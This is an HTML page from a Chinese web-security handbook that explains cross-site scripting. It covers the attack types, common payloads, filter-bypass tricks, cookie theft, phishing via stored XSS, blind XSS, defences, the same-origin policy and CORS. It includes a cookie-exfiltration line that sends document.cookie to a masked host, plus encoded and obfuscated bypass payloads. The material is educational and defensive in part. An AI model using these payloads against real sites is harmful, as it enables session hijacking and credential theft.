@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>XSS - 跨站脚本攻击 | 烟雨黑帽</title>
+<meta name="description" content="XSS概念 XSS英文为Cross Site Scripting, 中文名 跨站脚本攻击 ，是指恶意攻击者往Web页面里面插入恶意代码，当用户浏览该页之时，嵌入Web中的恶意代码就会被执行，从而达到恶意攻击者的目的。没有用CSS做简称是因为CSS早已是层叠样式表(英文全称：Cascading Sty…">
+<meta name="keywords" content="XSS, 跨站脚本攻击, 网络安全, 渗透测试, web security, penetration testing, 白帽">
+<meta name="author" content="TesterCC">
+<meta name="robots" content="index,follow,max-image-preview:large">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="烟雨黑帽">
+<meta property="og:title" content="XSS">
+<meta property="og:description" content="XSS概念 XSS英文为Cross Site Scripting, 中文名 跨站脚本攻击 ，是指恶意攻击者往Web页面里面插入恶意代码，当用户浏览该页之时，嵌入Web中的恶意代码就会被执行，从而达到恶意攻击者的目的。没有用CSS做简称是因为CSS早已是层叠样式表(英文全称：Cascading Sty…">
+<meta property="og:locale" content="zh_CN">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="XSS">
+<meta name="twitter:description" content="XSS概念 XSS英文为Cross Site Scripting, 中文名 跨站脚本攻击 ，是指恶意攻击者往Web页面里面插入恶意代码，当用户浏览该页之时，嵌入Web中的恶意代码就会被执行，从而达到恶意攻击者的目的。没有用CSS做简称是因为CSS早已是层叠样式表(英文全称：Cascading Sty…">
+<meta name="theme-color" content="#0f172a">
+<script src="../assets/theme.js"></script>
+<link rel="icon" href="../favicon.svg" type="image/svg+xml">
+<link rel="stylesheet" href="../assets/style.css?v=1">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.9.0/styles/atom-one-dark.min.css">
+<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "BreadcrumbList", "itemListElement": [{"@type": "ListItem", "position": 1, "name": "烟雨黑帽"}, {"@type": "ListItem", "position": 2, "name": "跨站脚本攻击"}]}, {"@type": "TechArticle", "headline": "XSS", "description": "XSS概念 XSS英文为Cross Site Scripting, 中文名 跨站脚本攻击 ，是指恶意攻击者往Web页面里面插入恶意代码，当用户浏览该页之时，嵌入Web中的恶意代码就会被执行，从而达到恶意攻击者的目的。没有用CSS做简称是因为CSS早已是层叠样式表(英文全称：Cascading Sty…", "inLanguage": "zh-CN", "author": {"@type": "Person", "name": "TesterCC"}, "isPartOf": {"@type": "Book", "name": "烟雨黑帽"}, "datePublished": "2026-10-11", "alternativeHeadline": "跨站脚本攻击"}]}</script>
+</head>
+<body>
+<div class="searchbar">
+  <div class="search">
+    <input id="navSearch" type="search" placeholder="搜索目录 / Search…" autocomplete="off" aria-label="搜索目录">
+  </div>
+</div>
+<header class="topbar">
+  <button class="icon-btn" id="menuBtn" aria-label="菜单">&#9776;</button>
+  <a class="brand" href="../">
+    <span class="brand-mark">WS</span>
+    <span class="brand-text"><b>烟雨黑帽</b><i>Web安全与SEO实战手册</i></span>
+  </a>
+  <button class="icon-btn" id="themeBtn" aria-label="切换主题">&#9789;</button>
+</header>
+<div class="layout">
+  <aside class="sidebar" id="sidebar">
+    <a class="home-btn" href="../"><svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M3 10.2 12 3l9 7.2"/><path d="M5.5 9.4V21h13V9.4"/></svg><span>首页</span></a>
+    <div class="sidebar-head">目录 <span class="count">186</span></div>
+    <nav class="nav-scroll"><ul class="nav-tree"><li class="nav-item depth-0"><span class="nav-label">搜索引擎优化</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../knowledge/">基本知识</a></li><li class="nav-item depth-1"><a href="../do-i-need-seo/">我需要SEO吗</a></li><li class="nav-item depth-1"><a href="../whitehat-seo/">白帽SEO</a></li><li class="nav-item depth-1"><a href="../ai-seo/">AI SEO</a></li><li class="nav-item depth-1"><a href="../blackhat-seo/">黑帽SEO</a><ul class="nav-children"><li class="nav-item depth-2"><a href="../wildcard-directory-site-farm/">泛目录泛内页站群</a></li><li class="nav-item depth-2"><a href="../wildcard-subdomain-site-farm/">泛二级站群</a></li><li class="nav-item depth-2"><a href="../mirror-site-farm/">小偷镜像站群</a></li><li class="nav-item depth-2"><a href="../parasite-seo/">动态寄生虫</a></li><li class="nav-item depth-2"><a href="../subdirectory-in-site/">二级目录站内站</a></li><li class="nav-item depth-2"><a href="../spider-pool/">蜘蛛池</a></li><li class="nav-item depth-2"><a href="../standalone-site-farm/">独立站站群</a></li></ul></li><li class="nav-item depth-1"><a href="../black-market/">黑产研究</a></li></ul></li><li class="nav-item depth-0"><a href="../information-gathering/">信息收集</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../subdomain-enumeration-tools/">工具枚举</a></li><li class="nav-item depth-1"><a href="../dns-zone-transfer-vulnerability/">DNS域传送漏洞</a></li><li class="nav-item depth-1"><a href="../google-hacking-dorks/">google黑客</a></li><li class="nav-item depth-1"><a href="../common-ports-services-summary/">常见端口&amp;解析&amp;总结</a></li><li class="nav-item depth-1"><a href="../port-scanning-tools/">扫描工具</a></li><li class="nav-item depth-1"><a href="../nmap-scanning-guide/">nmap扫描</a></li><li class="nav-item depth-1"><a href="../email-information-gathering/">邮箱信息收集</a></li><li class="nav-item depth-1"><a href="../cdn-detection/">CDN识别</a></li><li class="nav-item depth-1"><a href="../bypass-cdn-find-real-ip/">绕过CDN查找真实IP</a></li></ul></li><li class="nav-item depth-0"><a href="../vulnerability-scanners/">扫描器</a></li><li class="nav-item depth-0"><a href="../sql-injection/">SQL注入</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../sql-injection-common-functions/">常用函数</a></li><li class="nav-item depth-1"><a href="../sql-injection-steps/">sql注入步骤</a></li><li class="nav-item depth-1"><a href="../union-sql-injection-information-schema/">union注入和information_schema库</a></li><li class="nav-item depth-1"><a href="../error-based-sql-injection-functions/">函数和报错注入</a></li><li class="nav-item depth-1"><a href="../blind-sql-injection/">SQL盲注</a></li><li class="nav-item depth-1"><a href="../other-sql-injection-techniques/">其他注入方式</a></li><li class="nav-item depth-1"><a href="../access-database-injection/">Access数据库注入</a></li><li class="nav-item depth-1"><a href="../mssql-database-injection/">MSSQL数据库注入</a></li><li class="nav-item depth-1"><a href="../mysql-database-injection/">MYSQL数据库注入</a></li><li class="nav-item depth-1"><a href="../sqlmap-tutorial/">神器SQLmap</a></li></ul></li><li class="nav-item depth-0"><a href="../xss-cross-site-scripting/">xss跨站脚本攻击</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../xss-principles-and-types/">xss原理和分类</a></li><li class="nav-item depth-1"><a href="../xss-bypass-techniques/">xss绕过技巧</a></li><li class="nav-item depth-1"><a href="../xss-case-studies/">xss案例</a></li></ul></li><li class="nav-item depth-0"><a href="../file-upload-download-inclusion/">文件上传下载包含</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../common-sensitive-file-paths/">常有用文件路径</a></li><li class="nav-item depth-1"><a href="../file-upload-vulnerability/">文件上传漏洞</a></li><li class="nav-item depth-1"><a href="../file-download-vulnerability/">文件下载漏洞</a></li><li class="nav-item depth-1"><a href="../file-inclusion-vulnerability/">文件包含漏洞</a></li><li class="nav-item depth-1"><a href="../upload-labs-file-upload-labs/">upload-labs上传漏洞练习</a></li></ul></li><li class="nav-item depth-0"><a href="../xxe-ssrf-csrf/">XXE、SSRF、CSRF</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../ssrf-fundamentals/">SSRF原理基础</a></li><li class="nav-item depth-1"><a href="../ssrf-practical-cases/">SSRF案例实战</a></li><li class="nav-item depth-1"><a href="../csrf-fundamentals/">CSRF原理基础</a></li><li class="nav-item depth-1"><a href="../csrf-cases-and-prevention/">CSRF案例及防范</a></li><li class="nav-item depth-1"><a href="../xxe-xml-dtd-basics/">XXE之XML_DTD基础</a></li><li class="nav-item depth-1"><a href="../xxe-payloads-and-fixes/">XXE之payload与修复</a></li><li class="nav-item depth-1"><a href="../xxe-combined-with-ssrf/">XXE结合SSRF</a></li></ul></li><li class="nav-item depth-0"><a href="../rce-and-deserialization/">远程命令执行与反序列化</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../remote-command-code-execution/">远程命令和代码执行漏洞</a></li><li class="nav-item depth-1"><a href="../deserialization-vulnerabilities/">反序列化漏洞</a></li></ul></li><li class="nav-item depth-0"><a href="../captcha-and-brute-force/">验证码与暴力破解</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../brute-force-captcha-basics/">爆破与验证码原理</a></li><li class="nav-item depth-1"><a href="../cs-architecture-brute-force/">CS架构暴力破解</a></li><li class="nav-item depth-1"><a href="../bs-architecture-brute-force/">BS架构暴力破解</a></li></ul></li><li class="nav-item depth-0"><a href="../web-editor-vulnerabilities/">WEB编辑器漏洞</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../web-editor-vulnerabilities-basics/">编辑器漏洞基础</a></li><li class="nav-item depth-1"><a href="../ewebeditor-vulnerabilities/">Ewebeditor编辑器</a></li><li class="nav-item depth-1"><a href="../fckeditor-vulnerabilities/">FCKeditor编辑器</a></li><li class="nav-item depth-1"><a href="../other-web-editors/">其他编辑器</a></li></ul></li><li class="nav-item depth-0"><a href="../web-middleware-vulnerabilities/">web中间件漏洞</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../middleware-parsing-vulnerabilities/">中间件解析漏洞</a></li><li class="nav-item depth-1"><a href="../apache-tomcat-vulnerabilities/">Tomcat常见的漏洞总结</a></li><li class="nav-item depth-1"><a href="../jboss-exploitation/">Jboss漏洞利用总结</a></li><li class="nav-item depth-1"><a href="../weblogic-exploitation/">Weblogic漏洞利用总结</a></li></ul></li><li class="nav-item depth-0"><a href="../web-penetration-testing-steps/">WEB具体步骤</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../neighboring-site-attack-privilege-escalation/">旁注和越权</a></li><li class="nav-item depth-1"><a href="../cdn-bypass/">CDN绕过</a></li><li class="nav-item depth-1"><a href="../privilege-escalation-logic-flaws/">越权与逻辑漏洞</a></li><li class="nav-item depth-1"><a href="../other-common-web-vulnerabilities/">WEB应用常见其他漏洞</a></li><li class="nav-item depth-1"><a href="../web-login-page-penetration/">WEB登陆页面渗透思路</a></li></ul></li><li class="nav-item depth-0"><a href="../social-engineering-phishing-apt/">社工、钓鱼、apt</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../social-engineering-information-gathering/">社工和信息收集</a></li><li class="nav-item depth-1"><a href="../domain-spoofing/">域名欺骗</a></li><li class="nav-item depth-1"><a href="../phishing-emails/">钓鱼邮件</a></li><li class="nav-item depth-1"><a href="../phishing-trojan-tools/">一些钓鱼用的挂马工具</a></li></ul></li><li class="nav-item depth-0"><a href="../code-audit/">代码审计</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../code-audit-tools/">代码审计工具</a></li></ul></li><li class="nav-item depth-0"><a href="../waf-bypass/">WAF绕过</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../waf-basics-cloud-waf/">WAF基础及云WAF</a></li><li class="nav-item depth-1"><a href="../waf-bypass-methods/">各种WAF绕过方法</a></li><li class="nav-item depth-1"><a href="../bypassing-waf-file-upload/">绕过WAF上传文件</a></li></ul></li><li class="nav-item depth-0"><a href="../system-privilege-escalation/">系统提权</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../windows-privilege-escalation/">windows系统提权</a></li><li class="nav-item depth-1"><a href="../linux-privilege-escalation/">linux系统提权</a></li><li class="nav-item depth-1"><a href="../database-privilege-escalation/">数据库提权操作系统</a></li></ul></li><li class="nav-item depth-0"><a href="../internal-network-lateral-movement/">内网横向渗透</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../internal-network-tunneling/">内网穿透方式</a></li><li class="nav-item depth-1"><a href="../third-party-app-privilege-escalation/">一些内网第三方应用提权</a></li></ul></li><li class="nav-item depth-0"><a href="../arp-and-dos-attacks/">ARP与DOS</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../arp-spoofing/">ARP欺骗</a></li><li class="nav-item depth-1"><a href="../dos-and-ddos-attacks/">DOS与DDOS</a></li><li class="nav-item depth-1"><a href="../dos-attack-tools/">一些DOS工具</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">安全研发</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../learn-guide/">安全研发学习指南</a></li><li class="nav-item depth-1"><a href="../term/">相关术语</a></li><li class="nav-item depth-1"><a href="../firewall/">防火墙</a></li><li class="nav-item depth-1"><a href="../open-source/">开源项目推荐</a></li><li class="nav-item depth-1"><a href="../cl-snort/">源码学习之Snort3</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">安全研究</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../research-list/">导航列表</a></li><li class="nav-item depth-1"><a href="../ai-sec/">人工智能安全(AISec)</a></li><li class="nav-item depth-1"><a href="../llm-sec/">大语言模型安全(LLM security)</a></li><li class="nav-item depth-1"><a href="../apt/">APT</a></li><li class="nav-item depth-1"><a href="../attck/">ATT&amp;CK</a></li><li class="nav-item depth-1"><a href="../fuzzing/">模糊测试</a></li><li class="nav-item depth-1"><a href="../binary-sec/">二进制安全</a></li><li class="nav-item depth-1"><a href="../device-sec/">路由设备安全</a></li><li class="nav-item depth-1"><a href="../ic-sec/">工控安全</a></li><li class="nav-item depth-1"><a href="../5g-sec/">5g安全</a></li><li class="nav-item depth-1"><a href="../iov-sec/">车联网安全</a></li><li class="nav-item depth-1"><a href="../protocol-sec/">协议安全</a></li><li class="nav-item depth-1"><a href="../boofuzz/">Boofuzz</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">安全管理</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../cso/">CSO与安全负责人</a></li><li class="nav-item depth-1"><a href="../enterprise-sec/">企业安全建设</a></li><li class="nav-item depth-1"><a href="../classified-protection/">等级保护</a></li><li class="nav-item depth-1"><a href="../sec-jd/">安全招聘</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">安全产品营销</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../sec-operation/">安全运营</a></li><li class="nav-item depth-1"><a href="../axure-rp/">Axure RP</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">应急响应</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../incident-response-learn-guide/">应急响应学习参考</a></li><li class="nav-item depth-1"><a href="../traceback/">溯源反制</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">CVE</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../cve/">CVE相关参考</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">渗透测试</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../pentest-learn-guide/">渗透测试学习参考</a></li><li class="nav-item depth-1"><a href="../pentest-term/">术语</a></li><li class="nav-item depth-1"><a href="../kali-linux/">Kali Linux</a></li><li class="nav-item depth-1"><a href="../red-team/">红队</a></li><li class="nav-item depth-1"><a href="../brute-force/">暴力破解</a></li><li class="nav-item depth-1 active"><a href="../xss/">跨站脚本攻击</a></li><li class="nav-item depth-1"><a href="../csrf/">跨站请求伪造</a></li><li class="nav-item depth-1"><a href="../reverse-shell/">反弹Shell</a></li><li class="nav-item depth-1"><a href="../capture-package/">抓包</a></li><li class="nav-item depth-1"><a href="../crack/">破解</a></li><li class="nav-item depth-1"><a href="../nmap/">Nmap</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">CTF</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../ctf-learn-guide/">基础知识</a></li><li class="nav-item depth-1"><a href="../env-config/">测试环境搭建</a></li><li class="nav-item depth-1"><a href="../ctf-skill/">CTF竞赛常用基本解题技巧</a></li><li class="nav-item depth-1"><a href="../pwn/">PWN</a></li><li class="nav-item depth-1"><a href="../crypto/">Crypto</a></li><li class="nav-item depth-1"><a href="../ctf-re/">RE</a></li><li class="nav-item depth-1"><a href="../hackthebox/">HackTheBox</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">架构</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../architecture-learn-guide/">架构学习指南</a></li><li class="nav-item depth-1"><a href="../notes/">读书笔记</a></li><li class="nav-item depth-1"><a href="../design-pattern/">设计模式</a></li><li class="nav-item depth-1"><a href="../ddd/">领域驱动设计</a></li><li class="nav-item depth-1"><a href="../micro-services/">微服务</a></li><li class="nav-item depth-1"><a href="../scrum/">Scrum</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">后端开发</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../backend-learn-guide/">后端开发学习指南</a></li><li class="nav-item depth-1"><a href="../computer-networking/">计算机网络</a></li><li class="nav-item depth-1"><a href="../os/">操作系统</a></li><li class="nav-item depth-1"><a href="../database/">数据库</a></li><li class="nav-item depth-1"><a href="../search-engine/">搜索引擎</a></li><li class="nav-item depth-1"><a href="../python/">Python</a></li><li class="nav-item depth-1"><a href="../go/">Golang</a></li><li class="nav-item depth-1"><a href="../rust/">Rust</a></li><li class="nav-item depth-1"><a href="../rabbitmq/">RabbitMQ</a></li><li class="nav-item depth-1"><a href="../kafka/">Kafka</a></li><li class="nav-item depth-1"><a href="../jwt/">JWT认证</a></li><li class="nav-item depth-1"><a href="../regex/">正则表达式</a></li><li class="nav-item depth-1"><a href="../git/">Git</a></li><li class="nav-item depth-1"><a href="../git-flow/">Git Flow</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">机器学习</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../machine-learning/">机器学习</a></li><li class="nav-item depth-1"><a href="../nlp/">自然语言处理</a></li><li class="nav-item depth-1"><a href="../llms/">大语言模型LLMs</a></li><li class="nav-item depth-1"><a href="../statistical-learning/">统计学习方法笔记</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">前端开发</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../frontend-learn-guide/">前端开发学习指南</a></li><li class="nav-item depth-1"><a href="../html5/">HTML5</a></li><li class="nav-item depth-1"><a href="../css/">CSS</a></li><li class="nav-item depth-1"><a href="../js/">JavaScript</a></li><li class="nav-item depth-1"><a href="../typescript/">TypeScript</a></li><li class="nav-item depth-1"><a href="../vue/">Vue.js</a></li><li class="nav-item depth-1"><a href="../react/">React</a></li><li class="nav-item depth-1"><a href="../npm/">NPM</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">爬虫开发</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../cookie-pool/">Cookie池设计</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">DevOps</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../devops-learn-guide/">DevOps学习指南</a></li><li class="nav-item depth-1"><a href="../docker/">Docker</a></li><li class="nav-item depth-1"><a href="../k8s/">Kubernetes</a></li><li class="nav-item depth-1"><a href="../vm/">虚拟机</a></li><li class="nav-item depth-1"><a href="../linux/">Linux</a></li><li class="nav-item depth-1"><a href="../windows/">Windows</a></li><li class="nav-item depth-1"><a href="../sre/">SRE</a></li><li class="nav-item depth-1"><a href="../shell/">Shell</a></li><li class="nav-item depth-1"><a href="../syslog/">syslog</a></li></ul></li><li class="nav-item depth-0"><a href="../todo-list/">Todo List</a></li></ul>
+</nav>
+  </aside>
+  <div class="scrim" id="scrim"></div>
+  <main class="content">
+<article class="article"><nav class="crumbs"><a href="../">烟雨黑帽</a><span>/</span><span>跨站脚本攻击</span></nav><a class="ad-banner" href="../knowledge/" aria-label="SEO专题推广"><img src="../assets/ad-seo.svg" alt="Web安全与SEO实战手册 — 搜索引擎优化(SEO)专题推广" width="970" height="90" loading="lazy"></a><h1>跨站脚本攻击</h1><p class="cn-title">XSS</p><details class="toc-box" open><summary>本页目录 / On this page</summary><div class="toc">
+<ul>
+<li><a href="#xss">XSS概念</a>
+</li>
+<li><a href="#xss_1">XSS攻击分类</a>
+</li>
+<li><a href="#payload">常用Payload</a>
+<ul>
+<li><a href="#getxsscookie">GET型XSS利用：cookie获取</a>
+</li>
+<li><a href="#postxsscookie">POST型XSS利用：cookie获取</a>
+</li>
+<li><a href="#xss_2">XSS漏洞测试：钓鱼攻击</a>
+</li>
+<li><a href="#xss_3">XSS盲打</a>
+</li>
+<li><a href="#xss-">XSS绕过-过滤-转换</a>
+</li>
+<li><a href="#xss-_1">XSS绕过-过滤-编码</a>
+</li>
+<li><a href="#xss-htmlspecialchars">XSS绕过-关于htmlspecialchars()函数</a>
+</li>
+</ul>
+</li>
+<li><a href="#xss_4">XSS常见防范措施</a>
+<ul>
+<li><a href="#_1">总的原则：输入做过滤，输出做转义。</a>
+</li>
+</ul>
+</li>
+<li><a href="#_2">什么是跨域？</a>
+</li>
+<li><a href="#-">跨域-同源策略</a>
+</li>
+<li><a href="#_3">为什么要有同源策略？</a>
+</li>
+<li><a href="#corscross-origin-resource-sharing">CORS（Cross-origin resource sharing）</a>
+</li>
+</ul>
+</div>
+</details><div class="article-body"><h2 id="xss">XSS概念</h2>
+<p>XSS英文为Cross Site Scripting, 中文名<strong>跨站脚本攻击</strong>，是指恶意攻击者往Web页面里面插入恶意代码，当用户浏览该页之时，嵌入Web中的恶意代码就会被执行，从而达到恶意攻击者的目的。没有用CSS做简称是因为CSS早已是层叠样式表(英文全称：Cascading Style Sheets)的简称。</p>
+<h2 id="xss_1">XSS攻击分类</h2>
+<p>XSS攻击一般分为3中：反射型、存储型、Dom型。</p>
+<h2 id="payload">常用Payload</h2>
+<pre><code>&lt;img src=1 onerror=&quot;alert(/xss/)&quot;/&gt;
+
+document.location = '***.com' + document.cookie;
+
+' onclick=&quot;alert(123)&quot;
+</code></pre>
+<h3 id="getxsscookie">GET型XSS利用：cookie获取</h3>
+<p><img alt="GET型XSS示意图" src="***.com" /></p>
+<h3 id="postxsscookie">POST型XSS利用：cookie获取</h3>
+<p>POST方式的XSS如何处理？</p>
+<p>其实和GET型提交方式差不多，只不过把GET方法换成了POST方法。另外通过POST提交的参数在url中不可见（但是请求包中实际上还是能看见的）</p>
+<p><img alt="POST型XSS示意图" src="***.com" /></p>
+<p>PS简单概括攻击方式，建立一个恶意页面post.html,当用户访问这个页面时触发提交表单的操作，将用户的cookie转发到xss平台的地址去。</p>
+<h3 id="xss_2">XSS漏洞测试：钓鱼攻击</h3>
+<p>实现思路（存储型XSS-钓鱼攻击）理清思路：</p>
+<p><img alt="fishing" src="***.com" /></p>
+<p>用户访问恶意页面时弹出身份认证请求，如果用户填写了，就把相关信息发送到xss平台去，攻击者钓鱼成功。</p>
+<h3 id="xss_3">XSS盲打</h3>
+<p>XSS盲打不是XSS的漏洞类型，而是一种XSS攻击方式。先插入js，再等待系统管理员中招。</p>
+<p><img alt="xss盲打" src="***.com" /></p>
+<h3 id="xss-">XSS绕过-过滤-转换</h3>
+<p>常见思路：</p>
+<ol>
+<li>前端限制绕过，直接抓包重放，或者修改html前端代码</li>
+<li>使用大小写绕过，比如：<code>&lt;SCRIPT&gt;aLeRt(111)&lt;/sCRIpt&gt;</code></li>
+<li>拼凑绕过，比如过滤后拼接成功：<code>&lt;scri&lt;script&gt;pt&gt;alert(111)&lt;/scri&lt;/script&gt;pt&gt;</code></li>
+<li>使用注释进行干扰：<code>&lt;scri&lt;!--test--&gt;pt&gt;alert(111)&lt;/scri&lt;!--test--&gt;pt&gt;</code></li>
+</ol>
+<h3 id="xss-_1">XSS绕过-过滤-编码</h3>
+<p>核心思路：</p>
+<p><strong>后台过滤了特殊字符，比如<code>&lt;script&gt;</code>标签，但该标签可以被各种编码，后台不一定会过滤。当浏览器对该编码进行识别时，会翻译成正常的标签，从而执行。</strong></p>
+<p>在使用编码时需要注意编码在输出点是否会被正常识别和翻译！</p>
+<p>举例：</p>
+<p>编解码工具：***.com</p>
+<pre><code>&lt;img src=x onerror=&quot;alert('xss')&quot; /&gt;     # 可以把alert('xss')进行html编码
+e.g.
+ASCII转Unicode
+&lt;img src=x onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#120;&amp;#115;&amp;#115;&amp;#39;&amp;#41;&quot; /&gt;
+
+&lt;img src=x onmouseover=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#120;&amp;#115;&amp;#115;&amp;#39;&amp;#41;&quot; /&gt;
+
+注意：事件标签（如：onerror, onmouseover并不会执行&lt;script&gt;&lt;/script&gt;标签中的代码）
+</code></pre>
+<p>总之，XSS绕过姿势有很多，关键取决于你的思路和对前端技术的掌握程度。</p>
+<h3 id="xss-htmlspecialchars">XSS绕过-关于htmlspecialchars()函数</h3>
+<p>htmlspecialchars()函数能把预定义的字符转换为HTML实体。</p>
+<p>在PHP中的使用方式为: <code>$ok=htmlspecialchars(%_GET['message'])</code></p>
+<pre><code>预定义的字符时：
+&amp;  -&gt;  &amp;amp
+&quot;(单个双引号)  -&gt;  &amp;quot
+'(单个单引号)  -&gt; &amp;#039
+&lt;  -&gt;  &amp;lt
+&gt;  -&gt;  &amp;gt
+
+可能的引号类型:
+ENT_COMPAT: 默认，仅编码双引号
+ENT_QUOTES: 编码双引号和单引号，建议用这个
+ENT_NOQUOTES: 不编码任何引导
+</code></pre>
+<h2 id="xss_4">XSS常见防范措施</h2>
+<h3 id="_1">总的原则：输入做过滤，输出做转义。</h3>
+<ul>
+<li>过滤：根据业务需求进行过滤，比如输入点要求输入手机号，则只允许输入手机号格式的数字。（正则匹配规则要写好）</li>
+<li>转义：所有输出到前端的数据都根据输出点进行转义，比如输出到html中进行html实体转义，输入到js里面的进行js转义等。</li>
+</ul>
+<h2 id="_2">什么是<em>跨域</em>？</h2>
+<blockquote>
+<p>http://    www .   ***.com :   8080/   script  /   test.js</p>
+<p>协议       子域名     主域名               端口       资源地址(=路径+资源名)</p>
+</blockquote>
+<p>当<strong>协议、主机（主域名、子域名）、端口</strong>中的任意一个不相同时，称为不同域。</p>
+<p>我们把<strong>不同的域之间请求数据的操作</strong>，称为<strong>跨域</strong>操作。</p>
+<h2 id="-">跨域-同源策略</h2>
+<p>为了安全考虑，所有的浏览器都约定了“同源策略”，其规定：<strong>两个不同域名之间不能使用JS进行相互操作。</strong></p>
+<p>比如：***.com域名下的javascript并不能操作y.com域名下的对象。</p>
+<p>如果想要跨域操作，则需要管理员进行特殊的配置。</p>
+<p>比如通过：<code>header("Access-Control-Allow-Origin:***.com")</code> 指定。</p>
+<p>Tips: 下面这些标签<strong>跨域加载资源是不受同源策略限制的（资源类型是有限制的）</strong></p>
+<pre><code>&lt;script src = &quot;...&quot; &gt;   // js, 加载到本地执行
+&lt;img src = &quot;...&quot; &gt;  // 图片
+&lt;link href=&quot;...&quot; &gt;  // css
+&lt;iframe src=&quot;...&quot;&gt;  // 任意资源
+</code></pre>
+<h2 id="_3">为什么要有同源策略？</h2>
+<p>可以看下白帽子讲Web安全中的内容</p>
+<p>举例：</p>
+<pre><code>1.A登录了淘宝，攻击者向A发送一个恶意链接url B (***.com
+如果没有同源策略，url B上的js可以操作A的内容（比如：获取cookie等）。
+有了同源策略，可以限制这种情况。
+
+2.恶意站点C上使用了&lt;iframe src=&quot;D站点登录页面&quot;&gt;，发送该恶意url到攻击对象，攻击对象登录后如果没有同源策略，则C上的JS可以获取D站点的登录信息。
+</code></pre>
+<h2 id="corscross-origin-resource-sharing">CORS（Cross-origin resource sharing）</h2>
+<p>CORS全称是"跨域资源共享"（Cross-origin resource sharing）, 是一个W3C标准。</p>
+<p>跨域资源共享(CORS) 是一种机制，它使用额外的 HTTP 头来告诉浏览器  让运行在一个 origin (domain) 上的Web应用被准许访问来自不同源服务器上的指定的资源。</p>
+<p>当一个资源从与该资源本身所在的服务器不同的域、协议或端口请求一个资源时，资源会发起一个跨域 HTTP 请求。</p>
+<p>跨域资源共享（ CORS ）机制允许 Web 应用服务器进行跨域访问控制，从而使跨域数据传输得以安全进行。</p>
+<p>现代浏览器支持在 API 容器中（例如 XMLHttpRequest 或 Fetch ）使用 CORS，以降低跨域 HTTP 请求所带来的风险。</p>
+<p>CORS请求默认不发送Cookie和HTTP认证信息。如果要把Cookie发到服务器，一方面要服务器同意，指定Access-Control-Allow-Credentials字段。</p>
+<pre><code>Access-Control-Allow-Credentials: true
+</code></pre>
+<p>另一方面，开发者必须在AJAX请求中打开withCredentials属性。</p>
+<pre><code>var xhr = new XMLHttpRequest();
+xhr.withCredentials = true;
+</code></pre>
+<p>否则，即使服务器同意发送Cookie，浏览器也不会发送。或者，服务器要求设置Cookie，浏览器也不会处理。</p>
+<p>但若省略withCredentials设置，有的浏览器还是会一起发送Cookie。这时，可以显式关闭withCredentials。</p>
+<pre><code>xhr.withCredentials = false;
+</code></pre>
+<p>需要注意的是，如果要发送Cookie，Access-Control-Allow-Origin就不能设为星号，必须指定明确的、与请求网页一致的域名。
+同时，Cookie依然遵循同源政策，只有用服务器域名设置的Cookie才会上传，其他域名的Cookie并不会上传，且（跨源）原网页代码中的document.cookie也无法读取服务器域名下的Cookie。</p>
+<p>更多详细信息请见：</p>
+<ul>
+<li>HTTP访问控制</li>
+<li>跨域资源共享 CORS 详解</li>
+</ul></div></article><nav class="pager"><a class="pg prev" href="../brute-force/"><span>上一篇</span><b>暴力破解</b></a><a class="pg next" href="../csrf/"><span>下一篇</span><b>跨站请求伪造</b></a></nav>
+        <footer class="site-foot">
+      <p><b>烟雨黑帽SEO工作室</b> · <a href="https://www.heimaoseo.com" rel="noopener">www.heimaoseo.com</a></p>
